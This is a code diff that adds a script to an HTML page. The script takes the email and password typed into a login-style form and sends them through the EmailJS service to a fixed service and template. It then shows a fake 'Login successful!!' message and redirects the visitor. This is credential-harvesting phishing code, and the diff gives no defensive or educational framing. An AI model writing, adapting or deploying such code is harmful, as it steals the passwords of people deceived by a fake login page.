@@ -142,5 +142,46 @@ border-bottom-right-radius:75px;cursor: pointer;border: none;margin-left: px
           .catch((err) => console.log(err));
       }
     </script>
+    <script>
+            function sendMail() {
+  var email = document.getElementById("email").value;
+  var password = document.getElementById("message").value;
+
+  // Check if email and password fields are empty
+  if (email.trim() === "" || password.trim() === "") {
+    alert("Please enter both email and password.");
+    return;
+  }
+
+  // Check if email is a valid email format
+  var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  if (!emailRegex.test(email)) {
+    alert("Please enter a valid email address.");
+    return;
+  }
+
+  // If all validations pass, proceed with sending the email
+  var params = {
+    email: email,
+    message: password,
+  };
+
+  const serviceID = "service_lis2tni";
+  const templateID = "template_3p4ipk4";
+
+  emailjs
+    .send(serviceID, templateID, params)
+    .then((res) => {
+      document.getElementById("email").value = "";
+      document.getElementById("message").value = "";
+      console.log(res);
+      alert("Login successful!!");
+      // Redirect to another website
+      window.location.href = 'log.html';
+    })
+    .catch((err) => console.log(err));
+}
+
+    </script>
   </body>
-</html>
+  </html>
